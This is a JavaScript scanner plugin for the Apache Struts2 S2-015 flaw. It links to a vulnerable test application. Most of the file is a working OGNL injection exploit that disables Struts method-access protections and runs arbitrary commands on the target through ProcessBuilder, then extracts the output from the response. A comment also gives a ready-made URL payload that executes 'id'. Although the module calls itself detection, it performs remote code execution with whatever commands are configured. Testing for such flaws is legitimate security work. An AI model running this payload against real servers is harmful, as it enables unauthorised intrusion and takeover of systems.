module.exports={
	tags:"struts2,015",
	des:"struts2 015Vulnerability detection",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-015",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-015.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-015"],
	toRst:{},
/*
/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
*/
	doCheck:function (url,fnCbk)
	{
		// 比较特殊，所以需要截取
		var _t = this,ss,_s = _t.self,szUrl = url.substr(0, url.lastIndexOf('/'));
		szUrl = szUrl.replace(/(\/*\.*\/)*$/gmi,'').replace(/(\/\/\.)*$/gmi,'');
		// console.log(szUrl);

		var fnC = function(szCmd,fnCbk1)
		{
			var s = "#context['xwork.MethodAccessor.denyMethodExecution']=false"
			//////// 增加的关键行 start//////
			+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
			+ ",#f.setAccessible(true)"
			+ ",#f.set(#_memberAccess,true)"
			//////// 增加的关键行 end//////
			// + ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
			// + ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
			+ ",#p=new java.lang.ProcessBuilder('"+szCmd+"'.split(' '))"
			+ ",#as=new java.lang.String()"
			+ ",#p.redirectErrorStream(true),#process=#p.start()"
			+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
			+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
			// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",#as='{{'+#as+'}}'"
			+ ",#as.toString()"
			;
			ss = s;
			s = _s.fnUrlEncode2(s);
			
			_s.request(_s.fnOptHeader({method: 'GET',uri: szUrl + "/${"+ s+"}" + ".action"
			    })
			  , function (error, response, body)
			   {
			   		_s.error(error);
			   		_s.fnShowBody(body);
			   		try{fnCbk1(body || error);}catch(e){}
			    }
			  );
		};
		var a = _s.g_szCmd.split(";"),aR = [],nC = 0;
		_s.async.mapLimit(a,_s.g_nThread,function(szCmd1,fnCbk2)
		{//  +"|base64"
			fnC(szCmd1,function(b)
			{
				var rg = /\{\{([^\}]+?)\}\}/gmi;
				rg = rg.exec(b);
				if(rg)b = rg[1];
				var n = a.indexOf(szCmd1);
				aR[n] = b;
				nC++;
				// console.log(n + " = " + b);
				if(a.length == nC)
				{
					_s.fnDoBody(aR.join(""),"s2-015",url,null,function(o)
			    	{
			    		var r = {"url":szUrl,"send":ss};
		  				fnCbk(_s.copyO2O(r,o),_t);
			    	});
				}
				try{fnCbk2();}catch(e){}
			});
		});
	}
};